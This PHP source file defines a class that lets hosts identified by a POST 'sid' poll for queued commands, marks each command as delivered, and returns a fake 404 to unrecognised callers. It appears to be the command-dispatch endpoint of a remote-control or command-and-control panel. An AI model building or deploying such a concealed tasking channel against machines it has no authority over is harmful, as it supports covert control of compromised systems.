<?php
/**
 * 获取命令
 * 
 */
class zHook {
	private $sid = null;
	public function __construct() {
		$this->sid = isset($_POST['sid'])?$_POST['sid']:"";
	}
	
	public function init(){
		$sid = $this->sid;
		$host_obj = new zHost();
		if($host_obj->isExistSID($sid)){
			$id = $host_obj->getID($sid);
			$command_obj = new zCommand();
			$data = $command_obj->getCommand($id);
			$command_obj->updateCommand(1, $id);
			if(is_json($data['data']))
				$data['data'] = json_decode($data['data'], true);
			if(isset($data['id']))
				resp(1, $data['sid'], $data['command'], $data['data']);
			else 
				resp(0);
		}else{
			header ( "HTTP/1.0 404 Not Found" );
			exit ();
		}
	}
}